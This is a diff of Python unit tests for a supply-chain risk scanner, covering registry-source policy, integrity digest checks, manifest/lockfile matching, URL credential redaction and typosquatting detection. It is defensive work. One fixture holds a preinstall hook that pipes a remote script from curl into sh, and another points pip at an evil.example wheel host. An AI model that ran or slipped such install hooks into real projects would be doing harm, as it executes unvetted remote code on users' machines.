@@ -1,10 +1,24 @@
 """SR-008: Supply chain risk rule unit tests."""
 
 import json
+import base64
+import hashlib
+from datetime import date
+from pathlib import Path
 
+import jsonschema
 import pytest
 
-from scanners.risk_scanner.rules import supply_chain
+from scanners.risk_scanner.rules import installation_security, supply_chain
+from scanners.risk_scanner.dependency_parsers.models import (
+    DependencySourceObservation,
+    DependencySourceUsage,
+)
+from scanners.risk_scanner.registry_policy import (
+    RegistryClassification,
+    RegistryEntry,
+    RegistryPolicy,
+)
 from tests.scanner_mock import MockScanner
 
 
@@ -113,6 +127,432 @@ class TestSR008SupplyChain:
             in advisories[0]["description"]
         )
         assert "registry.npmmirror.com (275)" in advisories[0]["evidence"]
+        details = advisories[0]["registry_policy"]
+        assert details["occurrence_count"] == 275
+        assert len(details["occurrences"]) == 100
+        assert details["truncated"] is True
+        assert details["occurrences"][0]["source_ref"].startswith("#/packages/")
+        assert details["occurrences"][0]["integrity"] == "sha512-0"
+
+    def test_registry_policy_group_and_total_evidence_budgets(self):
+        packages = {
+            f"node_modules/dependency-{host}-{index}": {
+                "version": "1.0.0",
+                "resolved": f"https://mirror-{host}.example/dependency-{index}.tgz",
+            }
+            for host in range(30)
+            for index in range(30)
+        }
+        s = MockScanner(files={})
+        s._file_contents = {"package-lock.json": json.dumps({
+            "lockfileVersion": 3, "packages": packages,
+        })}
+
+        supply_chain.run(s)
+
+        groups = [advisory for advisory in s.review_advisories
+                  if advisory["code"] == "dependency_registry_policy"]
+        overflow = [advisory for advisory in s.review_advisories
+                    if advisory["code"] == "dependency_registry_policy_overflow"]
+        assert len(groups) == 25
+        assert len(overflow) == 1
+        assert sum(len(group["registry_policy"]["occurrences"]) for group in groups) == 500
+        assert all(group["registry_policy"]["truncated"] for group in groups)
+        assert sum(group["registry_policy"]["occurrence_count"] for group in groups) == 750
+        assert "150 条记录" in overflow[0]["description"]
+        assert overflow[0]["level"] == "high"
+
+    def test_registry_policy_samples_are_stable_across_lockfile_order(self):
+        entries = [
+            (f"node_modules/demo-{index}", {
+                "version": "1.0.0",
+                "resolved": f"https://registry.npmmirror.com/demo-{index}.tgz",
+            })
+            for index in range(5)
+        ]
+
+        def evidence(ordered_entries):
+            s = MockScanner(files={})
+            s._file_contents = {"package-lock.json": json.dumps({
+                "lockfileVersion": 3, "packages": dict(ordered_entries),
+            })}
+            supply_chain.run(s)
+            return s.review_advisories[0]["registry_policy"]["occurrences"]
+
+        assert evidence(entries) == evidence(list(reversed(entries)))
+
+    def test_registry_policy_sample_fields_have_size_limits(self):
+        s = MockScanner(files={})
+        s._file_contents = {"package-lock.json": json.dumps({
+            "lockfileVersion": 3,
+            "packages": {"node_modules/demo": {
+                "version": "1.0.0",
+                "resolved": "https://registry.npmmirror.com/" + "x" * 4000,
+                "integrity": "sha512-" + "a" * 4000,
+            }},
+        })}
+
+        supply_chain.run(s)
+
+        sample = s.review_advisories[0]["registry_policy"]["occurrences"][0]
+        assert len(sample["resolved_url"]) == 512
+        assert len(sample["integrity"]) == 160
+        assert sample["resolved_url"].endswith("…")
+
+    def test_registry_policy_source_file_has_consistent_size_limit(self):
+        from src.models.packages import RegistryPolicyEvidence
+
+        long_path = "nested/" + "a" * 540 + "/package-lock.json"
+        observation = DependencySourceObservation(
+            ecosystem="npm",
+            url="https://unapproved.example/demo.tgz",
+            usage=DependencySourceUsage.RESOLVED_DOWNLOAD,
+            source_file=long_path,
+        )
+        s = MockScanner(files={})
+
+        supply_chain._check_dependency_sources(s, [observation])
+
+        advisory = s.review_advisories[0]
+        details = advisory["registry_policy"]
+        assert len(details["source_file"]) == 512
+        assert details["source_file"] == advisory["location"]["file"]
+        assert details["source_file"] == details["occurrences"][0]["file"]
+        assert details["source_file"].endswith("…")
+        assert long_path not in advisory["evidence"]
+        RegistryPolicyEvidence.model_validate(details)
+
+    def test_manifest_source_ref_uses_original_json_pointer_key(self):
+        records = supply_chain._manifest_records({"dependencies": {
+            "python": [{"name": "requests"}],
+            "vendor/tools": [{"name": "helper"}],
+        }})
+
+        assert (records[0].ecosystem, records[0].source_ref) == (
+            "PyPI", "#/dependencies/python/0",
+        )
+        assert records[1].source_ref == "#/dependencies/vendor~1tools/0"
+
+    def test_shared_url_retains_each_integrity_and_scope(self):
+        resolved = "https://registry.npmmirror.com/shared.tgz"
+        packages = {
+            "node_modules/runtime-a": {
+                "version": "1.0.0", "resolved": resolved, "integrity": "sha512-a",
+            },
+            "node_modules/runtime-b": {
+                "version": "2.0.0", "resolved": resolved, "integrity": "sha512-b",
+            },
+            "node_modules/dev-c": {
+                "version": "3.0.0", "resolved": resolved,
+                "integrity": "sha512-c", "dev": True,
+            },
+        }
+        s = MockScanner(files={})
+        s._file_contents = {"package-lock.json": json.dumps({
+            "lockfileVersion": 3, "packages": packages,
+        })}
+
+        supply_chain.run(s)
+
+        assert s.dependency_scan["dependencies_found"] == 3
+        assert len(s.review_advisories) == 1
+        advisory = s.review_advisories[0]
+        assert advisory["registry_policy"]["scope"] == "mixed"
+        assert advisory["registry_policy"]["occurrence_count"] == 3
+        assert advisory["level"] == "high"
+        assert {item["scope"] for item in advisory["registry_policy"]["occurrences"]} == {"runtime", "dev"}
+        assert {
+            item["integrity"]
+            for item in advisory["registry_policy"]["occurrences"]
+        } == {"sha512-a", "sha512-b", "sha512-c"}
+        assert {
+            item["dependency_name"]
+            for item in advisory["registry_policy"]["occurrences"]
+        } == {"runtime-a", "runtime-b", "dev-c"}
+
+    def test_mixed_dev_and_test_group_remains_warning_only(self):
+        s = MockScanner(files={}, _package_metadata={
+            "dependencies": {"npm": [
+                {"name": "dev-helper", "version": "1.0.0", "scope": "dev",
+                 "registry": "https://registry.npmmirror.com/"},
+                {"name": "test-helper", "version": "1.0.0", "scope": "test",
+                 "registry": "https://registry.npmmirror.com/"},
+            ]},
+        })
+
+        supply_chain.run(s)
+
+        assert len(s.review_advisories) == 1
+        assert s.review_advisories[0]["level"] == "warning"
+        assert s.review_advisories[0]["registry_policy"]["scope"] == "mixed"
+        assert s.review_advisories[0]["registry_policy"]["occurrence_count"] == 2
+
+    def test_requirements_latest_source_is_runtime_severity(self):
+        s = MockScanner(files={})
+        s._file_contents = {
+            "requirements-latest.txt": (
+                "--index-url https://registry.example/simple/\n"
+                "demo==1.0.0\n"
+            ),
+        }
+
+        supply_chain.run(s)
+
+        assert len(s.review_advisories) == 1
+        assert s.review_advisories[0]["level"] == "high"
+        assert s.review_advisories[0]["registry_policy"]["scope"] == "runtime"
+
+    def test_poetry_2_dev_only_source_stays_warning(self):
+        s = MockScanner(files={})
+        s._file_contents = {
+            "poetry.lock": (
+                '[[package]]\nname = "demo"\nversion = "1.0.0"\n'
+                'groups = ["dev"]\n'
+                '[package.source]\ntype = "legacy"\n'
+                'url = "https://unapproved.example/simple"\n'
+            ),
+        }
+
+        supply_chain.run(s)
+
+        assert len(s.review_advisories) == 1
+        advisory = s.review_advisories[0]
+        assert advisory["level"] == "warning"
+        assert advisory["registry_policy"]["scope"] == "dev"
+        assert advisory["registry_policy"]["occurrences"][0]["scope"] == "dev"
+
+    def test_integrity_uses_acquired_bytes_and_remains_independent_of_source_policy(self):
+        good_bytes = b"verified dependency archive"
+        other_bytes = b"different dependency archive"
+        good_digest = base64.b64encode(hashlib.sha512(good_bytes).digest()).decode()
+        other_digest = base64.b64encode(hashlib.sha512(other_bytes).digest()).decode()
+        approved_url = "https://registry.npmjs.org/good/-/good-1.0.0.tgz"
+        unapproved_url = "https://registry.npmmirror.com/bad/-/bad-1.0.0.tgz"
+        s = MockScanner(files={})
+        s._file_contents = {"package-lock.json": json.dumps({
+            "lockfileVersion": 3,
+            "packages": {
+                "node_modules/good": {
+                    "version": "1.0.0", "resolved": approved_url,
+                    "integrity": f"sha512-{good_digest}",
+                },
+                "node_modules/bad": {
+                    "version": "1.0.0", "resolved": unapproved_url,
+                    "integrity": f"sha512-{other_digest}",
+                },
+            },
+        })}
+        s.dependency_artifacts = {
+            approved_url: good_bytes,
+            unapproved_url: good_bytes,
+        }
+
+        supply_chain.run(s)
+
+        assert s.dependency_scan["integrity"] == {
+            "status": "mismatch", "claimed_count": 2, "verified_count": 2,
+            "mismatch_count": 1, "unavailable_count": 0, "unsupported_count": 0,
+        }
+        assert len(s.review_advisories) == 1
+        assert s.review_advisories[0]["registry_policy"]["registry_host"] == "registry.npmmirror.com"
+        mismatches = [finding for finding in s.findings if "完整性摘要不一致" in finding["title"]]
+        assert len(mismatches) == 1
+        assert mismatches[0]["llm_review_exempt"] is True
+
+    def test_integrity_without_artifact_bytes_is_explicitly_not_checked(self):
+        s = MockScanner(files={})
+        s._file_contents = {"package-lock.json": self._package_lock("registry.npmjs.org", 2)}
+
+        supply_chain.run(s)
+
+        assert s.dependency_scan["integrity"]["status"] == "not_checked"
+        assert s.dependency_scan["integrity"]["claimed_count"] == 2
+        assert s.dependency_scan["integrity"]["verified_count"] == 0
+        assert not any("完整性摘要不一致" in finding["title"] for finding in s.findings)
+
+    def test_integrity_with_unsupported_digest_is_distinct_from_missing_bytes(self):
+        unsupported_url = "https://registry.npmjs.org/unsupported.tgz"
+        verified_url = "https://registry.npmjs.org/verified.tgz"
+        content = b"dependency archive"
+        verified_digest = base64.b64encode(hashlib.sha512(content).digest()).decode()
+        s = MockScanner(files={})
+        s._file_contents = {"package-lock.json": json.dumps({
+            "lockfileVersion": 3,
+            "packages": {"node_modules/unsupported": {
+                "version": "1.0.0", "resolved": unsupported_url,
+                "integrity": "md5-deadbeef",
+            }},
+        })}
+        s.dependency_artifacts = {unsupported_url: content}
+
+        supply_chain.run(s)
+
+        assert s.dependency_scan["integrity"] == {
+            "status": "unsupported", "claimed_count": 1, "verified_count": 0,
+            "mismatch_count": 0, "unavailable_count": 0, "unsupported_count": 1,
+        }
+        schema_path = Path(__file__).resolve().parents[3] / "packages/schema/scan-report.schema.json"
+        schema = json.loads(schema_path.read_text(encoding="utf-8"))
+        status_schema = schema["properties"]["dependency_scan"]["properties"]["integrity"]["properties"]["status"]
+        jsonschema.validate("unsupported", status_schema)
+
+        s._file_contents = {"package-lock.json": json.dumps({
+            "lockfileVersion": 3,
+            "packages": {
+                "node_modules/unsupported": {
+                    "version": "1.0.0", "resolved": unsupported_url,
+                    "integrity": "md5-deadbeef",
+                },
+                "node_modules/verified": {
+                    "version": "1.0.0", "resolved": verified_url,
+                    "integrity": f"sha512-{verified_digest}",
+                },
+            },
+        })}
+        s.dependency_artifacts[verified_url] = content
+        supply_chain.run(s)
+        assert s.dependency_scan["integrity"] == {
+            "status": "partial", "claimed_count": 2, "verified_count": 1,
+            "mismatch_count": 0, "unavailable_count": 0, "unsupported_count": 1,
+        }
+
+        del s.dependency_artifacts[verified_url]
+        supply_chain.run(s)
+        assert s.dependency_scan["integrity"] == {
+            "status": "partial", "claimed_count": 2, "verified_count": 0,
+            "mismatch_count": 0, "unavailable_count": 1, "unsupported_count": 1,
+        }
+
+    def test_source_evidence_redacts_url_credentials_and_query(self):
+        s = MockScanner(files={})
+        s._file_contents = {"package-lock.json": json.dumps({
+            "lockfileVersion": 3,
+            "packages": {"node_modules/demo": {
+                "version": "1.0.0",
+                "resolved": "https://user:password@registry.example/demo.tgz?token=secret#fragment",
+            }},
+        })}
+
+        supply_chain.run(s)
+
+        assert len(s.review_advisories) == 1
+        url = s.review_advisories[0]["registry_policy"]["occurrences"][0]["resolved_url"]
+        assert url == "https://registry.example/demo.tgz"
+        assert "password" not in json.dumps(s.review_advisories)
+
+    def test_invalid_url_evidence_identifies_each_rejected_url(self):
+        urls = [
+            "https://registry.example:invalid/first?token=secret",
+            "https://registry.example:invalid/second?token=secret",
+        ]
+        s = MockScanner(files={}, _package_metadata={
+            "dependencies": {"npm": [
+                {"name": f"demo-{index}", "registry": url}
+                for index, url in enumerate(urls)
+            ]},
+        })
+
+        supply_chain.run(s)
+
+        advisories = [item for item in s.review_advisories
+                      if item["code"] == "dependency_registry_policy"]
+        assert len(advisories) == 2
+        assert all(item["registry_policy"]["policy_reason"] == "invalid_url"
+                   for item in advisories)
+        assert all(item["registry_policy"]["registry_host"] == "<invalid-or-non-registry-url>"
+                   for item in advisories)
+        assert {item["evidence"].split("url_samples=", 1)[1] for item in advisories} == {
+            "https://registry.example:invalid/first",
+            "https://registry.example:invalid/second",
+        }
+        assert "secret" not in json.dumps(advisories)
+
+    def test_manifest_lock_mismatch_is_reported_once_without_registry_policy(self):
+        s = MockScanner(files={})
+        s._file_contents = {
+            "package.json": json.dumps({
+                "dependencies": {"alpha": "1.0.0", "beta": "2.0.0"},
+            }),
+            "package-lock.json": json.dumps({
+                "lockfileVersion": 3,
+                "packages": {"": {"dependencies": {"alpha": "1.1.0"}}},
+            }),
+        }
+
+        supply_chain.run(s)
+
+        assert s.dependency_scan["manifest_lock"] == {
+            "status": "mismatch", "checked_pairs": 1, "mismatch_count": 2,
+            "unchecked_count": 0,
+        }
+        assert len([finding for finding in s.findings if "清单与锁文件" in finding["title"]]) == 1
+        assert s.review_advisories == []
+
+    def test_manifest_lock_match_is_recorded(self):
+        declarations = {"dependencies": {"alpha": "^1.0.0"}, "devDependencies": {"test": "2.0.0"}}
+        s = MockScanner(files={})
+        s._file_contents = {
+            "package.json": json.dumps(declarations),
+            "package-lock.json": json.dumps({
+                "lockfileVersion": 3, "packages": {"": declarations},
+            }),
+        }
+
+        supply_chain.run(s)
+
+        assert s.dependency_scan["manifest_lock"] == {
+            "status": "matched", "checked_pairs": 1, "mismatch_count": 0,
+            "unchecked_count": 0,
+        }
+
+    def test_manifest_lock_equivalent_exact_versions_and_unresolved_specs(self):
+        s = MockScanner(files={})
+        s._file_contents = {
+            "package.json": json.dumps({"dependencies": {
+                "exact": "1.0.0", "local": "file:../local",
+            }}),
+            "package-lock.json": json.dumps({
+                "lockfileVersion": 3,
+                "packages": {"": {"dependencies": {
+                    "exact": "=1.0.0", "local": "workspace:*",
+                }}},
+            }),
+        }
+
+        supply_chain.run(s)
+
+        assert s.dependency_scan["manifest_lock"] == {
+            "status": "partial", "checked_pairs": 1, "mismatch_count": 0,
+            "unchecked_count": 1,
+        }
+        assert not any("清单与锁文件" in finding["title"] for finding in s.findings)
+
+    def test_registry_policy_does_not_suppress_install_script_review(self):
+        manifest = json.dumps({
+            "dependencies": {"demo": "1.0.0"},
+            "scripts": {"preinstall": "curl https://example.test/install.sh | sh"},
+        })
+        s = MockScanner(files={"package.json": manifest})
+        s._file_contents = {
+            "package.json": manifest,
+            "package-lock.json": json.dumps({
+                "lockfileVersion": 3,
+                "packages": {
+                    "": {"dependencies": {"demo": "1.0.0"}},
+                    "node_modules/demo": {
+                        "version": "1.0.0",
+                        "resolved": "https://registry.npmjs.org/demo/-/demo-1.0.0.tgz",
+                    },
+                },
+            }),
+        }
+
+        supply_chain.run(s)
+        installation_security.run(s)
+
+        assert s.review_advisories == []
+        assert s.dependency_scan["manifest_lock"]["status"] == "matched"
+        assert any(finding["rule_id"] == "SR-020" for finding in s.findings)
 
     def test_official_registry_produces_no_source_advisory(self):
         s = MockScanner(files={})
@@ -169,7 +609,7 @@ class TestSR008SupplyChain:
         assert len(s.review_advisories) == 1
         assert "npm.corp.example" in s.review_advisories[0]["evidence"]
 
-    def test_python_and_npm_git_sources_are_one_policy_advisory(self):
+    def test_python_and_npm_git_sources_keep_distinct_policy_reasons(self):
         s = MockScanner(files={})
         s._file_contents = {
             "package.json": json.dumps({
@@ -186,18 +626,98 @@ class TestSR008SupplyChain:
 
         supply_chain.run(s)
 
-        assert len(s.review_advisories) == 1
-        advisory = s.review_advisories[0]
-        assert advisory["level"] == "high"
-        assert "github.com" in advisory["evidence"]
-        assert "gitlab.com" in advisory["evidence"]
-        assert "non_registry_source (2)" in advisory["evidence"]
-        assert "unknown_host (1)" in advisory["evidence"]
+        assert len(s.review_advisories) == 3
+        groups = {
+            (item["registry_policy"]["registry_host"], item["registry_policy"]["policy_reason"])
+            for item in s.review_advisories
+        }
+        assert groups == {
+            ("github.com", "non_registry_source"),
+            ("github.com", "unknown_host"),
+            ("gitlab.com", "non_registry_source"),
+        }
         assert not any(
             "非官方依赖源" in finding["title"] for finding in s.findings
         )
 
-    def test_registry_advisory_lists_only_five_hosts_plus_count(self):
+    def test_short_find_links_and_bare_url_are_one_policy_advisory(self):
+        s = MockScanner(files={})
+        s._file_contents = {
+            "requirements.txt": (
+                "-f https://evil.example/wheels\n"
+                "https://evil.example/demo-1.0-py3-none-any.whl\n"
+            )
+        }
+
+        supply_chain.run(s)
+
+        advisories = [
+            item for item in s.review_advisories
+            if item["code"] == "dependency_registry_policy"
+        ]
+        assert len(advisories) == 1
+        assert "2 条" in advisories[0]["description"]
+        assert "evil.example (2)" in advisories[0]["evidence"]
+        assert "unknown_host (2)" in advisories[0]["evidence"]
+        assert s.findings == []
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "npm install -f --registry https://mirror.internal/ demo\n",
+            "npm install -f \\\n  --registry https://mirror.internal/ demo\n",
+        ],
+    )
+    def test_npm_force_keeps_registry_api_approval(self, command):
+        s = MockScanner(files={"setup.sh": command})
+        s.registry_policy = RegistryPolicy([
+            RegistryEntry(
+                ecosystem="npm",
+                exact_host="mirror.internal",
+                classification=RegistryClassification.APPROVED_PRIVATE,
+                evidence_url="https://security.internal/npm",
+                allow_as_resolved_download=False,
+                note="Approved for npm registry API use only.",
+                reviewed_at=date(2026, 9, 23),
+            )
+        ])
+
+        supply_chain.run(s)
+
+        assert s.review_advisories == []
+
+    @pytest.mark.parametrize("option", ["-f", "--find-links"])
+    def test_pip_find_links_continuation_requires_download_approval(
+        self, option
+    ):
+        s = MockScanner(files={
+            "setup.sh": (
+                f"pip install {option} \\\n"
+                "  https://registry.example/wheels demo\n"
+            )
+        })
+        s.registry_policy = RegistryPolicy([
+            RegistryEntry(
+                ecosystem="pypi",
+                exact_host="registry.example",
+                classification=RegistryClassification.APPROVED_PRIVATE,
+                evidence_url="https://security.example/pypi",
+                allow_as_resolved_download=False,
+                note="Approved for registry API use only.",
+                reviewed_at=date(2026, 9, 23),
+            )
+        ])
+
+        supply_chain.run(s)
+
+        advisories = [
+            item for item in s.review_advisories
+            if item["code"] == "dependency_registry_policy"
+        ]
+        assert len(advisories) == 1
+        assert "usage_not_allowed (1)" in advisories[0]["evidence"]
+
+    def test_registry_advisory_separates_all_exact_hosts(self):
         packages = {
             f"node_modules/dependency-{index}": {
                 "version": "1.0.0",
@@ -215,14 +735,14 @@ class TestSR008SupplyChain:
 
         supply_chain.run(s)
 
-        assert len(s.review_advisories) == 1
-        evidence = s.review_advisories[0]["evidence"]
-        assert "registry-4.example" in evidence
-        assert "registry-5.example" not in evidence
-        assert "registry-6.example" not in evidence
-        assert "另有 2 个" in evidence
+        assert len(s.review_advisories) == 7
+        assert {
+            item["registry_policy"]["registry_host"]
+            for item in s.review_advisories
+        } == {f"registry-{index}.example" for index in range(7)}
+        assert all(item["registry_policy"]["occurrence_count"] == 1 for item in s.review_advisories)
 
-    def test_registry_advisory_evidence_includes_source_file_distribution(self):
+    def test_registry_advisory_separates_source_files(self):
         s = MockScanner(files={})
         s._file_contents = {
             ".npmrc": "registry=https://registry.corp.example/\n",
@@ -233,13 +753,14 @@ class TestSR008SupplyChain:
 
         supply_chain.run(s)
 
-        assert len(s.review_advisories) == 1
-        evidence = s.review_advisories[0]["evidence"]
-        assert "files=" in evidence
-        assert "package-lock.json (2)" in evidence
-        assert ".npmrc (1)" in evidence
+        assert len(s.review_advisories) == 2
+        counts = {
+            item["registry_policy"]["source_file"]: item["registry_policy"]["occurrence_count"]
+            for item in s.review_advisories
+        }
+        assert counts == {".npmrc": 1, "package-lock.json": 2}
 
-    def test_dependency_urls_in_code_join_the_same_policy_advisory(self):
+    def test_dependency_urls_in_code_keep_distinct_hosts(self):
         s = MockScanner(files={
             "setup.sh": (
                 "npm config set registry https://registry-one.example/\n"
@@ -249,14 +770,15 @@ class TestSR008SupplyChain:
 
         supply_chain.run(s)
 
-        assert len(s.review_advisories) == 1
-        assert "registry-one.example" in s.review_advisories[0]["evidence"]
-        assert "registry-two.example" in s.review_advisories[0]["evidence"]
+        assert len(s.review_advisories) == 2
+        assert {item["registry_policy"]["registry_host"] for item in s.review_advisories} == {
+            "registry-one.example", "registry-two.example"
+        }
         assert not any(
             "非官方包源" in finding["title"] for finding in s.findings
         )
 
-    def test_duplicate_inline_dependency_urls_count_once(self):
+    def test_duplicate_inline_dependency_urls_keep_both_locations(self):
         source = "https://registry.corp.example/"
         s = MockScanner(files={
             "setup.sh": (
@@ -269,8 +791,9 @@ class TestSR008SupplyChain:
 
         assert len(s.review_advisories) == 1
         advisory = s.review_advisories[0]
-        assert "检测到 1 条" in advisory["description"]
-        assert "registry.corp.example (1)" in advisory["evidence"]
+        assert "检测到 2 条" in advisory["description"]
+        assert "registry.corp.example (2)" in advisory["evidence"]
+        assert {item["line"] for item in advisory["registry_policy"]["occurrences"]} == {1, 2}
 
     def test_official_dependency_url_in_code_is_clean(self):
         s = MockScanner(files={
@@ -428,6 +951,28 @@ class TestSR008SupplyChain:
             "CVE-2099-0001" in finding["title"] for finding in s.findings
         )
 
+    def test_known_dependency_vulnerability_skips_llm_semantic_review(self, monkeypatch):
+        from src.routers import trust
+        from scanners.risk_scanner import llm_reviewer
+        from scanners.risk_scanner.redaction import build_finding_context_bundle
+
+        monkeypatch.setattr(supply_chain, "_query_osv", lambda *args, **kwargs: ["CVE-2099-0001"])
+        s = MockScanner(files={})
+        s._file_contents = {
+            "package-lock.json": self._package_lock("registry.npmjs.org", 1)
+        }
+        supply_chain.run(s)
+        cve = next(item for item in s.findings if "CVE-2099-0001" in item["title"])
+        cve["id"] = "known-cve"
+
+        assert cve["severity"] == "high"
+        assert cve["llm_review_exempt"] is True
+        assert trust._is_llm_reviewable_finding(cve) is False
+        assert build_finding_context_bundle([cve], s._file_contents)[0] == {}
+        result = llm_reviewer.run_llm_review([cve], {}, {})
+        assert result["status"] == "not_required"
+        assert result["findings_skipped"] == 1
+
     def test_requirement_version_fragment_is_not_sent_to_osv(self, monkeypatch):
         queries = []
 
@@ -480,6 +1025,44 @@ class TestSR008SupplyChain:
             for finding in report["findings"]
         )
         assert report["dependency_scan"]["dependencies_queried"] == 275
+        from src.models.packages import ScanReport
+
+        schema_path = Path(__file__).resolve().parents[3] / "packages/schema/scan-report.schema.json"
+        jsonschema.validate(report, json.loads(schema_path.read_text(encoding="utf-8")))
+        ScanReport.model_validate(report)
+
+    def test_risk_scanner_verifies_supplied_dependency_artifact(self, tmp_path):
+        from scanners.risk_scanner.dependency_parsers.osv_client import OSVQueryResult
+        from scanners.risk_scanner.scanner import RiskScanner
+
+        artifact = b"npm tarball bytes supplied by acquisition"
+        digest = base64.b64encode(hashlib.sha512(artifact).digest()).decode()
+        resolved = "https://registry.npmjs.org/demo/-/demo-1.0.0.tgz"
+        (tmp_path / "package-lock.json").write_text(json.dumps({
+            "lockfileVersion": 3,
+            "packages": {"node_modules/demo": {
+                "version": "1.0.0", "resolved": resolved,
+                "integrity": f"sha512-{digest}",
+            }},
+        }), encoding="utf-8")
+        scanner = RiskScanner(tmp_path, dependency_artifacts={resolved: artifact})
+
+        class NoVulnerabilityClient:
+            max_queries = 10
+            queried = 0
+
+            def query(self, _dependency):
+                self.queried += 1
+                return OSVQueryResult([], None)
+
+        scanner.osv_client = NoVulnerabilityClient()
+        report = scanner.scan()
+
+        assert report["dependency_scan"]["integrity"] == {
+            "status": "verified", "claimed_count": 1, "verified_count": 1,
+            "mismatch_count": 0, "unavailable_count": 0, "unsupported_count": 0,
+        }
+        assert not any("完整性摘要不一致" in finding["title"] for finding in report["findings"])
 
     def test_typosquatting_dependency(self, tmp_path):
         """Dependency 'requets' is 1 edit from known 'requests' → high finding."""
@@ -495,6 +1078,7 @@ class TestSR008SupplyChain:
         titles = [f["title"] for f in s.findings]
         assert any("Typosquatting" in t for t in titles)
         assert s.findings[0]["severity"] == "high"
+        assert s.findings[0].get("llm_review_exempt") is not True
 
     def test_excessive_triggers(self, tmp_path):
         """More than 10 triggers → low finding."""
